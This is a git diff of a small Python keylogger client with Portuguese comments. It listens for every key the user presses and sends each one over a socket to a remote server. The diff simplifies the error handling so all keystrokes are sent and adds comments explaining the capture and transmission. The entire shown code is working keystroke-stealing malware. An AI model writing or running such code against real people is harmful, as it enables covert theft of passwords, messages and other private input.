@@ -19,23 +19,19 @@ client_socket.connect((HOST, PORTA))
 
 
 def on_press(key):
-
     try:
         keydata = str(key)
-        client_socket.send(keydata.encode())
+        # recebe a tecla digitada  e transforma em string, para as futuras comparações
 
-    except AttributeError:
-        print(f'Tecla especial {key} foi  pressionada')
-        if (str(key) != "Key.backspace") and (str(key) != "Key.space") and (str(key) != "Key.esc"):
-            pass
-        else:
-            # Que faz o envio do dado para servidor
-            client_socket.send(keydata.encode())
+        client_socket.send(keydata.encode())
+        # Envia o número especificado de bytes de dados para um Socket conectado neste caso o socket do servidor
+
+    except Exception:
+        raise Exception
 
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
-
-
+# Método responsavel prara 'ouvir', 'observar' quais teclas estão sendo precionadas pelo uisuário
 
 
